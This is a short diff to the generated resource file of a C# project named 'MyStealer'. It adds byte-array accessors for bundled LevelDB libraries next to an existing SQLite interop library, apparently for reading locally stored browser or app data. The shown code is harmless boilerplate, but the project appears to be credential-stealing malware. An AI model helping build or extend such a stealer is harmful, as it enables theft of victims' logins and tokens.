@@ -63,6 +63,26 @@ namespace MyStealer.Properties {
         /// <summary>
         ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
+        internal static byte[] leveldb64 {
+            get {
+                object obj = ResourceManager.GetObject("leveldb64", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] leveldb86 {
+            get {
+                object obj = ResourceManager.GetObject("leveldb86", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
         internal static byte[] SQLiteInterop64 {
             get {
                 object obj = ResourceManager.GetObject("SQLiteInterop64", resourceCulture);
